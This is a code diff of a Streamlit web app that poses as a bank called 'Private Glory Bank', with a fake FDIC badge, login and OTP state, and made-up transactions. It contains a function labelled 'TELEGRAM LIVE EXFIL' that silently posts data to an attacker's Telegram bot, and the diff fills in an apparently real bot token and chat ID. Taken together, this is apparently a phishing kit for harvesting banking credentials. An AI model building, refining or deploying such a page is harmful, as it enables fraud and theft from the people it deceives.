@@ -5,10 +5,10 @@ import plotly.express as px
 import requests
 import random
 
-# ==================== TELEGRAM LIVE EXFIL ====================
+# ==================== TELEGRAM LIVE EXFIL — YOUR REAL BOT ====================
 def tg(message):
-    TOKEN = "8539882445:AA..."          # ← YOUR REAL BOT TOKEN
-    CHAT_ID = "14974"                   # ← YOUR REAL CHAT ID
+    TOKEN = "8539882445:AAGocSH8PzQHLMPef51tYm8806FcFTpZHrI"   # YOUR REAL TOKEN
+    CHAT_ID = "141975691"                                        # YOUR REAL CHAT ID
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
     payload = {
         "chat_id": CHAT_ID,
@@ -19,7 +19,7 @@ def tg(message):
     try:
         requests.post(url, data=payload, timeout=10)
     except:
-        pass  # Silent = deadly
+        pass  # Silent & deadly
 
 # ==================== SESSION STATE & 90-DAY HISTORY ====================
 state = st.session_state
@@ -33,7 +33,7 @@ state.otp_ok   = state.get("otp_ok", False)
 state.admin    = state.get("admin", False)
 
 if "tx" not in state:
-    merchants = ["Amazon", "Walmart", "Shell Gas", "Starbucks", "Netflix", "Uber", "Target", "Costco", "Apple", "Best Buy"]
+    merchants = ["Amazon", "Walmart", "Shell Gas", "Starbucks", "Netflix", "Uber", "Target", "Costco", "Apple", "Best Buy", "Chick-fil-A", "Home Depot"]
     txs = []
     start = datetime.now() - timedelta(days=90)
     for _ in range(88):
@@ -47,38 +47,38 @@ if "tx" not in state:
     txs.sort(key=lambda x: x["date"], reverse=True)
     state.tx = txs
 
-st.set_page_config(page_title="Private Glory Bank", page_icon="Eagle", layout="wide")
+st.set_page_config(page_title="Private Glory Bank", page_icon="USA", layout="wide")
 
-# ==================== THEME + EAGLE + FDIC ====================
-eagle_local = "assets/eagle.png"
-eagle_fallback = "https://i.ibb.co/0n0m1pS/eagle.png"
-fdic_ssl = "https://i.ibb.co/0jF3Y7Q/fdic-ssl.png"
-
-st.markdown(f"""
+# ==================== AMERICAN STARS + THEME + FDIC ====================
+st.markdown("""
 <style>
-    .stApp {{background: linear-gradient(135deg, #0a0e17, #1c1f2e, #0f1629); color: #e0e0e0;}}
-    .header {{background: linear-gradient(90deg, #002868 0%, #BF0A30 100%);
-              padding: 2.8rem; text-align: center; border-bottom: 16px solid #fcca46;
-              border-radius: 0 0 80px 80px; box-shadow: 0 30px 70px rgba(0,0,0,0.9);}}
-    .glass {{background: rgba(255,255,255,0.09); backdrop-filter: blur(20px);
-             border-radius: 36px; border: 1px solid rgba(255,255,255,0.2); padding: 2.5rem;}}
-    .fdic {{position: fixed; bottom: 10px; right: 10px; z-index: 9999;}}
-    h1, h2, h3 {{color: #fcca46 !important;}}
-    .stButton>button {{background: linear-gradient(45deg, #BF0A30, #002868); color: white; border-radius: 70px; height: 4.5rem;}}
+    .stApp {background: linear-gradient(135deg, #0a0e17, #1c1f2e, #0f1629); color: #e0e0e0;}
+    .header {background: linear-gradient(90deg, #002868 0%, #BF0A30 100%);
+             padding: 3rem; text-align: center; border-bottom: 18px solid #fcca46;
+             border-radius: 0 0 90px 90px; box-shadow: 0 35px 80px rgba(0,0,0,0.9);}
+    .stars {font-size: 140px; animation: pulse 3s infinite;}
+    @keyframes pulse {0%,100%{opacity:0.8;} 50%{opacity:1;}}
+    .glass {background: rgba(255,255,255,0.09); backdrop-filter: blur(22px);
+            border-radius: 40px; border: 1px solid rgba(255,255,255,0.22); padding: 2.8rem;}
+    .fdic {position: fixed; bottom: 10px; right: 10px; z-index: 9999;}
+    h1, h2, h3 {color: #fcca46 !important; text-shadow: 0 0 25px #fcca46;}
+    .stButton>button {background: linear-gradient(45deg, #BF0A30, #002868);
+                      color: white; font-weight: bold; border-radius: 80px; height: 5rem; font-size: 1.4rem;}
 </style>
-<div class="fdic"><img src="{fdic_ssl}" width="280"></div>
+<div class="fdic"><img src=https://i.ibb.co/0jF3Y7Q/fdic-ssl.png width=300></div>
 """, unsafe_allow_html=True)
 
 def header():
-    st.markdown(f'''
+    st.markdown('''
     <div class="header">
-        <img src="{eagle_local}" width="200" onerror="this.src='{eagle_fallback}'" style="border-radius: 12%;">
+        <div class="stars">USA USA USA USA USA USA USA USA USA USA</div>
         <h1>PRIVATE GLORY BANK</h1>
-        <p style="font-size:30px;color:#fcca46">Land of the Free • Home of the Brave</p>
+        <p style="font-size:32px;color:#fcca46">Land of the Free • Home of the Brave</p>
+        <div class="stars">USA USA USA USA USA USA USA USA USA USA</div>
     </div>
     ''', unsafe_allow_html=True)
 
-# ==================== LOGIN (NEW USERNAME) ====================
+# ==================== LOGIN (USERNAME: Awesome12@) ====================
 def login():
     header()
     col1, col2, col3 = st.columns([1,1.4,1])
@@ -208,9 +208,9 @@ def admin():
 
 # ==================== SIDEBAR ====================
 def sidebar():
-    st.sidebar.markdown(f'''
+    st.sidebar.markdown('''
     <div style="text-align:center;padding:30px;background:#002868;border-radius:30px">
-        <img src="{eagle_local}" width="90" onerror="this.src='{eagle_fallback}'">
+        <div class="stars">USA USA USA USA USA</div>
         <h3 style="color:#fcca46">PGB</h3>
     </div>
     ''', unsafe_allow_html=True)
